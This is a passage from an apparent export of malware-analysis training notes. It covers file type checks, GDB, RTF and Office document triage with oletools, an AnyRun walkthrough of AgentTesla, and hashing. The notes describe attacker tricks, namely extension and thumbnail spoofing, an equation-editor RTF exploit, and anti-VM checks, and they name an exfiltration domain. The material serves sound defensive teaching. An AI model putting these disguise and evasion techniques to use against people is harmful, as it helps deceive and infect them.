malware with “.docx” extension is seen, it indicates that the malware aims to infect the system or perform malicious activities using office programs. In static malware analysis, determining the file format is vital as analysis methods and tools may vary depending on the format. Additionally, each file format has its distinct characteristics which means that the attack vectors may also vary. For instance, thanks to the macro feature in office files with “.docx” extension, malware can be embedded in the file with “VisualBasic”. When the macro is executed, the malware runs.\nSimilarly, malicious “JavaScript” codes can be embedded in PDF files.\nFile Header\nWhen determining the format of a file, the part to examine is the file header. This is because the file header differs for each file type. The “magic bytes” field in the file header is a field that consists of the initial few bytes of the file and provides insights into the file type. In other words, magic bytes is the signature of the file.\nFor access to the signatures and extensions of numerous file types, you can visit the following address:\nList of File Signatures: en.wikipedia.org/wiki/List_of_file_signatures \n“Hex Editor” tools can be utilized to examine the file header and magic bytes fields. For example, the image below demonstrates the file headers of Windows executable (PE file) files.\n\nThe following address can be used to examine the images showing the headers of files with different file formats: \nFile Formats: github.com/corkami/pics/blob/master/binary/README.md \nFile Extensions\nA file extension is an appendage added to the end of the file name that gives information about the format of the file. Typically, each different file type has its own extension. For example, “.html” is the extension for web pages that contain HTML code. Below are statistics on the file extensions most commonly used by malware in 2020:\n\nFile Type and File Extension Mismatch\nTypically, the file extension provides accurate information about the file format. However, in certain cases, attackers can deceive their targets by disguising the extension and successfully execute their attacks. For instance, the file in the image below appears to be a “PDF” file looking at its extension.\n\nHowever, the “File name extensions” option on Windows must be activated to find out if this is really a PDF file.\n\nAs can be seen in the image above, it cannot be definitively concluded that the file is a PDF file since the option to display file extensions is not enabled. Upon enabling this feature, let’s see the file extension:\n\nThe image above shows that the actual extension of the file is “.exe”.\nFile Thumbnail Faking\nIn addition to the method described in the previous topic, attackers may also modify the thumbnail image associated with the file to enhance the effectiveness of their attack. By doing so, they not only conceal the actual file extension but also prevent the user from learning the real file format. For instance, in the previous example, the thumbnail of the file reveals that it is not a PDF file but instead a Windows executable file.\n\nHowever, when viewing the file as shown in the image above, it is easy to initially mistake it for a PDF file.\n\nUpon enabling the option to display file extensions, it becomes evident that the file in question is not a PDF file, but rather a file with the “.exe” extension. \nHow to Identify File Type Automatically?\nIn some cases, it may be necessary to find out the file type with the help of a tool. When a large number of files need to be analyzed in a short time, for instance, it may be necessary to use tools that automatically detect the file type to save time.\nFile Type Identification with DROID Tool\nThe “DROID” tool, which runs on the Windows operating system and has a graphical user interface (GUI), is one of the tools used to detect file types. You can access the DROID tool from the address below:\nDROID: www.nationalarchives.gov.uk/information-management/manage-information/preserving-digital-records/droid/ \nWhen the DROID tool is initially launched, a tab similar to the one depicted below is displayed:\n\nThe files to be analyzed are provided to the tool via the “Add” button.\n\nOnce the files are added, the process is initiated and the results are seen by clicking the “Start” button.\n\nAs demonstrated in the image above, the file format information of files is successfully obtained.\nFile Type Identification with Online Web Services\nIn static malware analysis, it is possible to use online web services to determine the file type of the malware. By uploading the file of the malware to online web services, the file type can be learned.\nNote: When detecting malware file types using online services, it should be considered that the file is uploaded to the target website. If sharing the file with the target web address poses a critical and inconvenient situation, performing the analysis in isolated sandbox environments using offline tools is recommended.\nFor example, a file type detection is performed using the online web address “checkfiletype.com” below:\n\nThere are numerous web addresses used for identifying the file type. Some of these addresses are listed below:\n\n\nwww.detectfiletype.com/ \n\n\nfilext.com/ \n\n\nfiletypechecker.com/ \n\n\nwww.sisik.eu/file  \n\n\nwww.aconvert.com/analyze.html \n\n\nwww.checkfiletype.com/ \n\n\nwww.toolsley.com/file.html \n\n\nHow to Identify File Type Manually?\nIn static malware analysis, file type detection can typically be accomplished using tools or simple methods. However, for custom file types and/or files with damaged file headers, manual examination may be required. In such situations, the file’s signature can be identified, and the file type can be determined with the assistance of hex editor tools.\nYou can access the hex editor tool named “HxD” seen in the image below from the following address:\nHxD: mh-nexus.de/en/hxd/ \nFor example, the signature of a Windows executable file is shown below on the hex editor:\n\nAs observed in the provided image, the file’s signature was detected using the hex editor, leading to the identification of the file as a Windows executable."},"Malware-Analysis/GNU-Debugger-(GDB)":{"slug":"Malware-Analysis/GNU-Debugger-(GDB)","filePath":"Malware Analysis/GNU Debugger (GDB).md","title":"GNU Debugger (GDB)","links":["Assets/5bb11b59a8e0c0c04ac38b451564a401_MD5.gif"],"tags":[],"content":"What is GDB?\nGNU Debugger (GDB) is a reverse engineering tool that enables debugging Linux executable files on the Linux command line.\nThe installation of GDB\nInstalling the GDB tool on Linux is quite simple. Since the “Debian” Linux distro is used in this training, the installation of the gdb tool is explained for Debian. The same command can be used for any Debian based Linux distro:\nCommand: `sudo apt-get install gdb\n\nAs seen in the image above, when the gdb installation command is applied, the gdb tool is installed by giving the answer “Y” to the question asked.\n\nAs seen in the image above, after the gdb tool installation is completed, the gdb tool can be opened with the “gdb” command. The gdb tool can be used without any plugins as it is here.\nPEDA (Python Exploit Development Assistance) Plugin Installation\nThere are some specific plugins to use the gdb tool with a more understandable user interface. One of them is the PEDA (Python Exploit Development Assistance) plugin. This plugin provides a more colorful and more understandable interface to the user during debugging. The PEDA plugin can be downloaded from:\nPEDA: github.com/longld/peda \nNote: PEDA gdb plugin has already been installed on the Linux machine given in the training.\nThe PEDA plugin installation steps are as in the image below:\n\nLet’s execute the installation commands above.\nCommand: `git clone github.com/longld/peda.git ~/peda\n\nAs seen in the image above, the PEDA plugin has been successfully downloaded.\nCommand: `echo “source ~/peda/peda.py” &gt;&gt; ~/.gdbinit\n\nAs seen in the image above, the command that provides the necessary settings to open the gdb tool with the PEDA plugin has been successfully applied.\nLet’s open the gdb tool and check see if the PEDA plugin is installed properly:\n\nAs we can see it in the screenshot above, the PEDA plugin was successfully installed and the gdb tool was opened with the PEDA plugin.\nIntroduction to Debugging with GDB\nIf the “-q” parameter is used while opening the gdb tool, the banner information is not printed on the command line:\n\nSince the gdb tool is a tool that works on the command line, all operations are executed through the gdb specific commands. In order to see all the commands of the gdb tool, the following command can be applied:\nCommand: `help all\n\nNote: Since the output of the command applied in the above image is very long, only the first part is displayed.\nBasic GDB Commands\nBelow are the basic commands that we must know in order to use the gdb tool:\nNote: We will use the executable file named “helloworld” that we also used in the previous parts of the training to apply the commands here.\nFile Command\nAfter opening the gdb tool, the file to be debugged is given to the program with the below file command:\nCommand: `file helloworld\n\nInfo Command\nAfter the file is given to gdb with the file command, it should be determined where the program flow will be stopped. Generally, executable files written in C programming language are started to be debugged from the “main” function:\nThe “info” command is that the one that provides information in accordance with the given parameter. For example, let’s see the functions in the executable file with this command:\nCommand: `info functions\n\nBreak (or b) Command\nThe points where the program flow will be stopped on gdb are called “breakpoints”. The command used to set a breakpoint is the “break” or “b” command for short. The break command can be given an address or a function name as a parameter. Let’s put a breakpoint in the “main” function seen in the output of the previous command:\nCommand: `break main\n\nAs it can be seen in the screenshot above, a breakpoint has been placed in the main function successfully.\n\nThe “info breakpoints” command can display all the set breakpoints as you can see in the image above.\nRun Command\nThe gdb commands so far are the commands applied before the executable file named “helloworld” is run. The program is executable after the breakpoint is set.\nThe “run” command is to “run” the executable. Let’s start the debugging process by executing the command:\n\nThe see the main screen during the debugging process on gdb on the image above. There are 3 sections on this screen:\n\nRegisters\nCode\nStack\n\n“Registers” is the field that displays the current values of the registers after each instruction execution.\n“Code” is the field where the executed instructions in the program flow are located.\n“Stack” is the field where the elements in the stack data structure are displayed.\nNexti(ni) and Stepi(si) Commands\n“nexti(ni)” and “stepi(si)” are vitally important commands to be able to execute each instruction in the program flow. A single instruction is executed with the “nexti(ni)” command and changes are applied to the relevant register or data fields. With this command will not enable us to get into the functions called with the “call” instruction. If the next instruction to be executed is “call” and it is needed to get into the called function, the “stepi(si)” command should be executed.\nFor example, in the previous image, we saw that the “call” instruction will be executed in the program flow. Let’s go inside the function called with the “si” command:\nNote: Let’s set a breakpoint at the address of the instruction after the “call” instruction in the main function, so that we can go back to where we left off in the main function after entering the function called with “call”:\nCommand: `b *0x565561ad\n\nNote: As you can see in the image above, ” * ” sign is prefixed to the address when setting breakpoints to memory addresses.\nLet’s enter into the function with the “si” command after setting up the breakpoint: \n\nThe above screenshot shows that the function has been entered successfully.\nContinue Command\n“Continue” is the command that should be used to execute the instructions up to the breakpoint, which was previously left in order to return to the main function. It can be abbreviated and use as “c”. Let’s run the instructions up to the breakpoint in the main function with the “continue” command: \nOpen: gdb16.gif\n\nThe above screenshot shows that the program was run successfully until the breakpoint with the “continue” command.\nSet Command\nIn some cases, we may need to interfere with the program flow during debugging. For example, we may need to jump the program flow directly to a different instruction. In this case, we need to change the value of the EIP register using the “set” command. Let’s set the value of the EIP register to a different address using the set command:\nCommand: `set $eip=0x565561bb\nNote: When assigning values to registers, a ”$” sign must be prefixed the register name in the command.\n\nThe above screenshot shows that the value of the EIP register has been changed successfully and the program flow has been interfered with.\nNote: The “context” command used in the screenshot above is used to show the current information on the debugging screen.\nQuit Command\n“Quit” is the command to close the gdb tool.\nNote: The GDB tool can be used online at at its own website below.\nOnline GDB: www.onlinegdb.com/"},"Malware-Analysis/How-to-Analyze-Malicious-RTF-Files":{"slug":"Malware-Analysis/How-to-Analyze-Malicious-RTF-Files","filePath":"Malware Analysis/How to Analyze Malicious RTF Files.md","title":"How to Analyze Malicious RTF Files","links":[],"tags":[],"content":"Analyzing malicious RTF files by examining their structure, inspecting embedded objects &amp; identifying potential threats.\nRTF (Rich Text Format) files, developed by Microsoft for cross-platform document interchange. Recently it’s utilized by malware authors due to their compatibility across different applications and platforms. These files can contain embedded objects like macros or scripts, exploited to execute malicious code upon opening.\nHow does it work?\nMalware authors often employ social engineering tactics, disguising RTF files as legitimate documents, to deceive users into opening them. Additionally, RTF files can evade detection by antivirus software through obfuscation techniques or zero-day exploits, providing an effective means for distributing malware payloads while minimizing the risk of detection and analysis.\nFile Details:\nHash : b2b8ef2a3bf64dd5531bd414e7f946c9f040ab2674bc73eb0d4af0d314623174\nMagic : Rich Text Format data, version 1\nFilename: Unknown.rtf / SecuriteInfo.com.Exploit.ShellCode.69.14498.22623.rtf\nFileType: Rich Text Format (.rtf)\nSize : 72.10 KB (73827 bytes)\nHow to Analyze the RTF File?\nTo analyze an RTF file effectively, it’s essential to first understand its structure and syntaxes.\nThe RTF (Rich Text Format) file structure usually begins with a header, followed by the document body containing content, formatting instructions, and embedded objects. Formatting elements are defined using control words, denoted by special sequences with a backslash (). Special characters and escapes represent characters with special meaning. Embedded objects like images or macros may be included. The file concludes with an end-of-file marker indicating the document’s end.\n\nControl words in RTF files are specific sequences of characters, typically represented by a backslash (), that function as commands to define formatting, document properties, or other instructions. These control words play a crucial role in specifying various elements within the document, such as font styles, text alignment, paragraph formatting, and more. \nFor instance, “\\b” signifies bold text, “\\i” denotes italic text, and “\\par” indicates a paragraph break. Essentially, control words enable the encoding of the document’s structure and formatting within the plain text content of the RTF file, facilitating consistent rendering across different software applications.\n\nLet’s analyze the sample, going through each step one by one.\nHeader of the RTF File:\n\nManual Extraction of RTF Components:\nStep 1: Open the RTF sample using Microsoft Word.\nStep 2: After opening it, navigate to the “Save As” option and save a copy of the document in another format, such as Word 97-2003.\nStep 3: Once the copy is saved, extract the sample and generate a dump file.\nStep 4: Unzip the dump file to reveal the components of the RTF.\nStep 5: Proceed to analyse each of these components individually.\nStep 6: Notably, within the Word document, you’ll find the embedded Equation3 Editor.\nExtracted Dump file:\n\nObtained Embedded Equation3 Editor:\n\nDynamic Technique:\nAfter opening the RTF file, the embedded function links with the object, exploiting the equation editor, and establishes a connection with their malicious command and control (CNC) server. This connection facilitates the download of the payload file, enabling malicious activities to be executed on the system.\n\nObtained URL:\n\nAV Vendor Sandbox Results:\nAnalyzing sandbox results enables us to know whether the URL is associated with malware, phishing attempts, or other malicious activities. Here the obtained URL is marked as 100% malware.\n"},"Malware-Analysis/Malicious-Doc-Analysis":{"slug":"Malware-Analysis/Malicious-Doc-Analysis","filePath":"Malware Analysis/Malicious Doc Analysis.md","title":"Malicious Doc Analysis","links":["SOC/Security-Solutions"],"tags":[],"content":"Basic Analysis\nHashes\nFirst we check its md5 or sha256 hash using following command and run it through virustotal:\nmd5sum baddoc.doc\n \nsha256sum baddoc.doc\nMetadata\nWe can look for document’s metadata to get more info on the document using following command:\nexiftool baddoc.doc\nWe can also use olemeta for metadata:\nolemeta baddoc.doc\nStrings\nWe can extract strings from the document which can show us valuable insights such as IP Addresses, Paths, domains, Commands,etc.\nstrings -n 5 baddoc.doc\nHere, -n is used to set length of string to extract (5 or greater in this case).\nXorsearch\nXorsearch command is used to search for encrypted strings in the document.\nxorsearch baddoc.doc http\nThe above command will search for any encrypted strings in the file baddoc.doc which start with “http”.\nxorsearch -p baddoc.doc\nThe above command will search the file baddoc.doc and find any encrypted embedded executables.\nOletools\nDownload and Install:\nInstallation Guide\nThe recommended way to download and install/update the latest stable release of oletools is to use pip:\n\nOn Linux/Mac: sudo -H pip install -U oletools[full]\nOn Windows: pip install -U oletools[full]\n\nThis should automatically create command-line scripts to run each tool from any directory: olevba, mraptor, rtfobj, etc.\nTools:\nTools to analyze malicious documents\n\noleid: to analyze OLE files to detect specific characteristics usually found in malicious files.\nolevba: to extract and analyze VBA Macro source code from MS Office documents (OLE and OpenXML).\nMacroRaptor: to detect malicious VBA Macros\nmsodde: to detect and extract DDE/DDEAUTO links from MS Office documents, RTF and CSV\npyxswf: to detect, extract and analyze Flash objects (SWF) that may be embedded in files such as MS Office documents (e.g. Word, Excel) and RTF, which is especially useful for malware analysis.\noleobj: to extract embedded objects from OLE files.\nrtfobj: to extract embedded objects from RTF files.\n\nTools to analyze the structure of OLE files\n\nolebrowse: A simple GUI to browse OLE files (e.g. MS Word, Excel, Powerpoint documents), to view and extract individual data streams.\nolemeta: to extract all standard properties (metadata) from OLE files.\noletimes: to extract creation and modification timestamps of all streams and storages.\noledir: to display all the directory entries of an OLE file, including free and orphaned entries.\nolemap: to display a map of all the sectors in an OLE file.\n\nDeobfuscation\nWe will be using Oletools for deobfuscating the vba code. The steps for deobfuscation:\n1. Get the vba code\nWe can use Olevba for extracting the code as follows:\nolevba baddoc.doc &gt; baddoc.vba\n2. Deobfuscate the code\nWe will again use Olevba command but with some extra parameters for deobfuscation.\nolevba --deobf --reveal baddoc.vba &gt; baddoc_deobf.vba\nThis command will write the obfuscated code first and then the deobfuscated version below it.\n3. Manual deobfuscation\nOletools can only do so much. Manual deobfuscation will probably be necessary for encrypted strings and stuff.\n4. Analysis\nAfter the deobfuscation, the olevba generated table will contain much more info about the macro. Reanalysis can reveal a lot of info.\nVMonkey\nVMonkey is a terminal based linux-tool used to run the vba script safely and do some dynamic analysis. It displays all the dropped files, executed commands and stuff.\nTo run vmonkey will need the vba script (make sure to remove any boilerplate generated by the olevba tool.\nvmonkey baddoc.vba\nTo see just IOCs:\nvmonkey --iocs baddoc.vba\nNext: Security Solutions"},"Malware-Analysis/Malware-Analysis-Tools":{"slug":"Malware-Analysis/Malware-Analysis-Tools","filePath":"Malware Analysis/Malware Analysis Tools.md","title":"Malware Analysis Tools","links":[],"tags":[],"content":"Tools &amp; Software\nVirtualization Software\nWe do not want to conduct dynamic analysis on our own system as we need to run the malware to be able to examine its activities. For this reason, we should make use of Virtualization Software that helps us work on some virtual systems.\nThanks to these software, you can use a different operating system on your host operating system. If they are configured properly, you can perform your analysis safely, as malicious software cannot escape from this virtual operating system. It is useful to make a small note here on these virtualization software. Since these virtualization environments are essentially software, various vulnerabilities that allow malwares to escape out of these virtual environments and allow code executions on the host operating system may occur on these environments. For this reason, It is crucial to keep your virtualization software up-to-date.\nSome of the frequently used virtualization software are as follows;\n\nVMware Workstation\nVMware Fusion\nOracle Virtualbox\n\nAn ideal isolated dynamic analysis environment consists of a completely separate physical device and a separate network. However, setting up this complex environment is both very costly and it is not necessary to begin with.\nUtility Softwares\nAfter installing your own virtual operating system, you need to install software that will be useful in dynamic analysis. For example, we will not be able to perform dynamic analysis of office files with file extensions such as docx, xlsx without installing Microsoft Office or similar software on the system.\n\nMicrosoft Office\nAdobe Reader\nBrowser (Chrome, Firefox etc.)\nWinRAR\nText Editors (Notepad++, Sublime Text etc.)\n\nThe attackers are very familiar with the dynamic analysis method. Therefore they check whether frequently used software is installed or not on the target system to be able determine if the malware is running on a virtual operating system before performing malicious activities on the devices they compromised.\nDebuggers\nDebuggers are software that are generally used by programmers to test the codes and catch the errors. Debuggers help to see the instructions of a process and change the flow of the program\nMalware analysts frequently make use of debuggers to learn the working structure of the malware and disable some prevention mechanisms by making changes to the malware codes.\nFor instance, you want to analyze a malware that does not work when the device name is not “John”. With the help of the Debugger, you can disable this control by making changes to the codes in which this control is made, and ensure that the malware continues to run.\nSome debuggers that are frequently preferred by malware analysts are as follows.\n\nOllydbg\nX64dbg\nWindbg\nRadare2\n\nNetwork Monitoring Tools\nInformation such as the network connections established by the malware, the addresses it communicates with and how it communicates with those should be reported as a result of the malware analysis.\nWe need some software to detect the network activities of the malware. Some of them are as follows.\n\nWireshark\nFiddler\nBurp Suite\n\nProcess Monitoring Tools\nA new process is created for the program we run for malware analysis. In order to monitor these processes, we should use process monitoring tools.\nWindows already comes with a process monitoring tool called “Task Manager”. However, other process monitoring tools are more useful in terms of usage and features for malware analysis.\nYou can install the following process monitoring tools in the virtual operating system we will create for dynamic malware analysis.\n\nProcess Hacker\nProcess Explorer (SysInternals)\nProcmon (SysInternals)\n\nFile Activity Monitoring Tools\nFile activities are one of the first activities that should be followed in dynamic analysis. Malware can read files to collect information from the operating system, write other components of the malware to the file system, and move itself to the startup folder to ensure the persistence. Malware can be involved in various activities in the file system for these and other reasons. We should detect and indicate these activities in the malware analysis report.\nYou can use the following tools to see file activities.\n\nSysmon\n\nOther Tools\n\nSysInternal Tools\nCFF Explorer\nPEView\nTriDNet\nBinText\nPEiD\nRegshot\nHashMyFiles\n"},"Malware-Analysis/Malware-Analysis-Using-Anyrun":{"slug":"Malware-Analysis/Malware-Analysis-Using-Anyrun","filePath":"Malware Analysis/Malware Analysis Using Anyrun.md","title":"Malware Analysis Using Anyrun","links":[],"tags":[],"content":"Dynamic Analysis Using AnyRun\nYou can take advantage of sandbox services / products to quickly analyze malware.\nAnyRun is an interactive sandbox that you can use when you want to analyze malware quickly.\nAnyRun has options for paid or free use. If you want to take advantage of it for free, all your analysis is visible to others, therefore we do not recommend that you upload files that may contain personal data to AnyRun. In addition, the free plan has restrictions such as usage time.\nHow can we use AnyRun for our malware analysis, what kind of outputs we can get, let’s examine it together.\nLet’s download the malware with hash 80b51e872031a2befeb9a0a13e6fc480 to analyze via AbuseCH (Click here to download).\nWe have to click on the ”+” (New Task) button on the left menu to upload the malware we downloaded.\n\nLet’s upload the file we want to analyze on the screen that opens with the help of the “Choose a file” button. After the file is uploaded, we can determine the parameters such as which operating system we want to run the malware and 32/64 bit of operating system to use. After determining these, we open our sandbox with the help of the “Run” button at the bottom right of the screen that opens.\nWhen our machine is turned on, we run the malicious software we uploaded to see it’s activities.\nSome malware stays dormant for a certain period of time before performing its malicious activities, making analysis difficult. Let’s allow time for the malware to perform its activities, during this time, let’s examine the AnyRun interface together.\n\n\nFrom this area, you can use the operating system interactively.\nHere is a list of processes in this section. From here, you can easily see which childprocesses the malware you run has.\nIn this area there is network and files events.\nThis section contains details of the process.\n\nLet’s examine these outputs.\nFirst, let’s examine the process events of the malware in the section marked “2” in the image above.\n\nThe malware we run manually seems to have created 2 child processes. One of them is schtasks.exe, which is run to ensure persistence on the system by creating a schedule task and the other is the process specified as “AgentTesla” malware by AnyRun.\nWhen we click on Processes, information about this process is displayed in panel number 4. Let’s examine the details of all processes respectively.\nSince the process named “WinRAR.exe” is created when we extract the malware from the archive file to run it, we will not examine this process.\nWhen we click on the process with ID 2680, information about this process is listed on panel number 4.\n\nWith the “More Info” button on this panel, a page with detailed information about the process is opened. When we want to reach detailed information, we can use this section.\nWhen the process information with 2680 ID is examined, the malware:\n\nUses Task Scheduler,\nWrites a program to the file system which compile time is too old,\nWrites many files to the user directory\n\n\nWhen we examine the process with ID 2616, we see that it is schtasks.exe belonging to Task Scheduler.\nWhen we examine the “Command Line” parameters, we see that it creates a schedule task named “Updates\\neHneiobyhcrJJ”. The configurations for this schedule task are in the file “tmp5383.tmp”.\n\nWhen we examine the schedule task configuration file named tmp5383.tmp, we see that the program named “neHneiobyhcrJJ.exe” will run.\n\nWhen we examine the process with ID 3140:\n\nThis malware is recognized by AnyRun as AgentTesla,\nSteals credentials,\nCreating files in the user directory\n\n\nWhen we examine the network connections made from panel number 3, we see that malware connects to smtp.godforeu.com.\nWith the help of the button on the right of the panel, we can examine the incoming/outgoing data.\n\nWhen the network activities of the malware are examined, we find that malware exfiltrates data with the SMTP protocol.\nIf you want to examine, you can reach the analysis made here (Click here)."},"Malware-Analysis/Malware-Analysis":{"slug":"Malware-Analysis/Malware-Analysis","filePath":"Malware Analysis/Malware Analysis.md","title":"Malware Analysis","links":["Malware-Analysis/Static-Malware-Analysis","Malware-Analysis/Dynamic-Analysis-Steps","Malware-Analysis/Malware-Analysis-Using-Anyrun","Malware-Analysis/Online-Malware-Analysis-Services","Malware-Analysis/Dynamic-Malware-Analysis-Example-1","Malware-Analysis/Dynamic-Malware-Analysis-Example-2","Malware-Analysis/Setting-up-Malware-Analysis-Lab","Malware-Analysis/Malicious-Doc-Analysis","Malware-Analysis/Reverse-Engineering"],"tags":[],"content":"Malware Analysis Methods\n1. Static Malware Analysis\nIt is the approach of analyzing malicious software by reverse engineering methods without running them.\nStatic Malware analysis is explained in detail in Static Malware Analysis note.\n2. Dynamic Malware Analysis\nIt is the approach that examines the behavior of malicious software on the system by running it. We can do it in our own lab or using Anyrun.\n1.Steps for Dynamic Analysis\n2. Malware Analysis Using Anyrun\n3. Online Malware Analysis Services\n4. Examples of Dynamic Analysis\na.  Dynamic Malware Analysis Example 1\nb. Dynamic Malware Analysis Example 2\nMalware Analysis Lab\nWe can’t and shouldn’t run malware in our main system as it would infect it so we need a separate burner system to run and analyze malware. For this, we need a Malware Analysis Lab . Setting up a malware analysis lab is described in Setting up Malware Analysis Lab article.\nAlso Check out:\n1. Malicious Doc Analysis\n2. Reverse Engineering"},"Malware-Analysis/Malware-Hash":{"slug":"Malware-Analysis/Malware-Hash","filePath":"Malware Analysis/Malware Hash.md","title":"Malware Hash","links":[],"tags":[],"content":"What is File Hash?\nA hash is a value generated by a hash algorithm through mathematical calculations applied to a given set of data. Here, the input data for the hash algorithm is the file containing the malware. This specific type of hash is commonly called a “file hash.” It serves as a distinct signature for files.\n\nNote: Hash functions are a broad subject within the field of cryptology. While this course provides an overview of hash functions, it does not delve into the topic extensively. Instead, the focus here is on explaining the hash functions and their use in terms of static malware analysis.\nFinding the Hash of the File with the Tool\nOne of the primary resources in static malware analysis is existing analysis reports, which play a crucial role. The hash value of a file is employed to access these analysis reports. By searching the hash value of a file in well-known signature databases, it is possible to determine if the malware has been previously analyzed and obtain the corresponding analysis results. This approach offers the advantage of avoiding the need to upload the malware file to online sandbox environments. Consequently, if the goal is to prevent the malware file from being publicly published through online sandbox environments, this method ensures confidentiality. However, it is essential to note that if a newly encountered malware lacks preliminary analysis, no analysis reports can be accessed using its hash value.\nThis section of the training demonstrates various methods for calculating the hash value of a malware file.\nThere are several tools used to calculate the hash of a file. For example, below “HashCalc” is used to calculate the hash value of the malware.\n\nWhen the HashCalc tool is launched, it appears as shown in the image above. It is possible to calculate both hash values of files and hash values of texts via the HashCalc tool.  To do so, the appropriate option in the “Data Format” field located in the top-left corner should be chosen.  “File” as the data format option should be selected:\n\nAfter selecting the data format, the malware file is provided to the tool for hash calculation.\n\nAfter selecting the desired hash algorithm for hash calculation using HashCalc as in the above example, the hash values are calculated by clicking the “Calculate” button located at the bottom right of the tool.\n\nAs can be seen in the image above, the hash of the malware has been successfully calculated for various hash functions. While the “HashCalc” tool demonstrated above is quite helpful in calculating the hash of individual files, it may not efficiently handle the computation of hash values for multiple files simultaneously. In such cases, alternative tools like “HashTools” are more suitable for calculating the hash of multiple files.\nThe “HashTools” tool features a graphical user interface that closely resembles the one shown above. When HashTools is initially launched, it will appear as the following:\n\nThe files whose hash will be calculated are added to the tool with the help of the buttons in the upper left part of the window seen in the image above. After the files are added, the hash calculation can be performed according to the desired hash algorithm with the help of the buttons at the bottom of the window.\n\nAs seen in the image above, the hash values of the files have been successfully calculated in accordance with the MD5 hash algorithm. With this tool, the hash of multiple files can be calculated rapidly. However, calculations are allowed for only one hash algorithm at a time. It is recommended to consider this when deciding which hash tool to use.\nThe following tools running on Windows can also be used to find the file hash:\nHashMyFiles: www.nirsoft.net/utils/hash_my_files.html \nQuickHash: www.quickhash-gui.org/  \nObtaining The Hash of The File Through Powershell\nIn certain scenarios, it may be necessary to calculate file hashes via the command line. In Windows, file hashes can be easily calculated using Powershell. For example, let’s calculate the hash of malware using Powershell:\nCommand: ```\nGet-FileHash .\\eabfb9aaa4d1adec7c124bd0bda7a81c53249f2bac5743bedf67adf705d0d1f4.exe | Format-List\n\nAs shown in the image above, the file hash can be calculated using the “Get-FileHash” command in PowerShell. The command can work with just a single parameter, which is the file’s name. By default, the calculation is performed using the SHA256 hash function. If a different hash function is needed, the “-Algorithm” parameter should be added. As an instance of this, let’s calculate the hash of the same malware file using the MD5 hash function.\nCommand:\nGet-FileHash .\\eabfb9aaa4d1adec7c124bd0bda7a81c53249f2bac5743bedf67adf705d0d1f4.exe -Algorithm MD5 | Format-List\n\nAs in the image above, the hash calculation for the MD5 hash function has been performed successfully.\nNote: The PowerShell command mentioned above, “Format-List,” enables the output to be presented in a list format. When this command is omitted, the output will be displayed on a single line.\nInformation Gathering with File Hash\nThe previous section demonstrated the process of calculating the hash of a malware file. In this part of the training, the various resources that can be utilized to gather information about malware are introduced using the hash value. The following list of resources can be used to collect information about the malware using File Hash:\n\nVirusTotal: www.virustotal.com/gui/home/search \nAnyRun: app.any.run/submissions/ \nJoe Sandbox: www.joesandbox.com/#windows \nHybrid Analysis: www.hybrid-analysis.com/ \nMetaDefender: metadefender.opswat.com/ \nEchoTrail: www.echotrail.io/ \nIntezer: analyze.intezer.com/scan\nFileScan.IO: www.filescan.io/scan\nInQuest Labs: labs.inquest.net/dfi/search/hash/sha256 \nManalyzer: manalyzer.org/ \nSandboxPikkerEE: sandbox.pikker.ee/ \nYomi: yomi.yoroi.company/upload \n\nVirusTotal\nVirusTotal is one of the prominent sources for searching hashes of malware and accessing available analysis reports. The image of the web page is as follows:\n\nThe current analysis report can be accessed by searching the hash in the search section seen in the image above. For example, the analysis report of a malware is as follows:\n\nThe image above displays a section of the analysis report. VirusTotal is a valuable resource that provides extensive information about malware."},"Malware-Analysis/Memory-Layout":{"slug":"Malware-Analysis/Memory-Layout","filePath":"Malware Analysis/Memory Layout.md","title":"Memory Layout","links":[],"tags":[],"content":"What is Memory?\nMemory is one of the most basic hardware units used for running the programs and the operation of the computer. When the computer is started, the operating system which is actually a software, the system software is loaded into the memory. The operating system is much larger than other software. Memory is a storage unit that is temporarily used during the execution of programs. Today, programs use memory for data storage because they use too much program data in size to be kept in processor variables. Memory contains some data structures that have their own special functions.\nNote: For detailed study in memory forensics, please refer to the following link:\nMemory Forensics: app.letsdefend.io/training/lessons/memory-forensics \nWhat is Stack and Heap?\nA “Stack” is a section of memory that is allocated when a program is run. Stack contains local variables and function arguments of the program.\n“Heap” is a partition in memory that is reserved when a program is run. There are dynamic variables created for the program in the heap. There are no static variables in the heap as it is in the stack. Compared to the stack, heap is larger and has more freedom inside the operating system.\nHow Stack and Heap Work?\nStack is an area that expands from high memory addresses to low memory addresses. The heap is the exact opposite and expands from low memory addresses to high memory addresses.\n\nStack Operations\nStack applies a certain method when importing or extracting data from its data structure. This method is called “Last In First Out (LIFO)”. In this method, the data that enters the data structure last is removed from the stack in the first place. There are two basic functions in the Stack data structure. These are the “Push” and “Pop” functions.\nPush\n“Push” is the function that provides data intake to the stack. The below image shows how a few data are placed on the stack with the push function respectively, and the working principle of the stack:  \n\nThe above image simply shows how the data is placed into the stack. Access to the data in the stack is provided by memory addresses and the ESP register. Each data in the stack has a separate memory address.\nPop\n“Pop” is a function that helps extract data from the stack. The below image shows the working principle of the stack as well as how some data that were previously placed in the stack in accordance with its working logic, are removed from the stack with the pop function:  \n\nWhat is Endianness?\nA processor can access the data in memory in different ways in accordance with the memory structure. This is called endianness and has 2 methods:\n\nBig Endian\nLittle Endian\n\nBig Endian is matching the byte at the smallest address in the memory with the byte (most significant byte) at the largest address in the register when accessing the memory.\n\nLittle Endian is matching the byte at the smallest address in the memory with the byte (least significant byte) at the smallest address in the register when accessing the memory.\n\nTf is endian?\nWatch this:\n"},"Malware-Analysis/Online-Malware-Analysis-Services":{"slug":"Malware-Analysis/Online-Malware-Analysis-Services","filePath":"Malware Analysis/Online Malware Analysis Services.md","title":"Online Malware Analysis Services","links":[],"tags":[],"content":"\nAnlyz\nAny.run\nComodo Valkyrie\nCuckoo\nHybrid Analysis\nIntezer Analyze\nSecondWrite Malware Deepview\nJevereg\nIObit Cloud\nBinaryGuard\nBitBlaze\nSandDroid\nJoe Sandbox\nAMAaaS\nIRIS-H\nGatewatcher Intelligence\nHatching Triage \nInQuest Labs\nManalyzer\nSandBlast Analysis\nSNDBOX\nfirmware\nopswat\nvirusade\nvirustotal\nmalware config\nmalware hunter team\nvirscan \njotti\n"},"Malware-Analysis/Packers--and--Unpackers":{"slug":"Malware-Analysis/Packers--and--Unpackers","filePath":"Malware Analysis/Packers & Unpackers.md","title":"Packers & Unpackers","links":[],"tags":[],"content":"What is Packing and Unpacking?\n“Packing” refers to the procedure of transforming an executable file into a different file format using a special algorithm for specific objectives. Conversely, “unpacking” denotes the process of reverting the packed file to its original form, essentially reversing the packing procedure.\nDetails about Packing/Unpacking operations are explained in the following topics.\n\nThe image displayed above shows the file structure of a Windows executable file both before and after the process of packing.\nWhat Does Packing Provide?\nPacking uses an algorithm that 